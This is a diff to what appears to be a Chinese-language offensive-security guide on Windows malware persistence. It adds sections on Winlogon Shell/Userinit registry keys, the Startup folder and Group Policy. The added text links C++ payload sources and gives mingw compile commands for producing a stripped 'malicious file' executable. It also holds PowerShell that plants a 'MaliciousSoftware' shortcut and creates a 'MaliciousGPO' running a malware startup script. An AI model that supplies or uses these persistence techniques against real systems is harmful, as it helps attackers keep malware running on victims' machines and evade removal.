@@ -793,3 +793,46 @@ x86_64-w64-mingw32-g++ -O2 run.cpp -o run.exe -I /usr/share/mingw-w64/include/ -
 Set-ItemProperty -Path "注册表路径" -Name "MaliciousSoftware" -Value "恶意文件目录"
 Remove-ItemProperty -Path "注册表路径" -Name "名称"
 ```
+
+2、Winlogon
+
++ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
++ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+
+[Shell.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Shell.cpp)
+
+[Userinit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Userinit.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 CPP文件 -o 恶意文件.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+3、启动文件夹持久化
+
+C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+[Startup.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/Startup.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 Startup.cpp -o Startup.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```powershell
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MaliciousSoftware.lnk")
+$Shortcut.TargetPath = "C:\Path\To\Malware.exe"
+$Shortcut.Save()
+```
+
+4、组策略持久化
+
+[gpedit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/gpedit.cpp)
+
+```powershell
+# 使用PowerShell配置组策略启动脚本
+$GPO = New-Object -ComObject GPMgmt.GPM
+$GPDomain = $GPO.GetDomain("domain.local", "", $null, $null)
+$GPO = $GPDomain.CreateGPO("MaliciousGPO")
+$GPO.SetSecurityDescriptor("O:BAG:BAD:(A;;GA;;;BA)")
+$GPO.SetStartupScript("C:\Path\To\Malware.bat")
+```
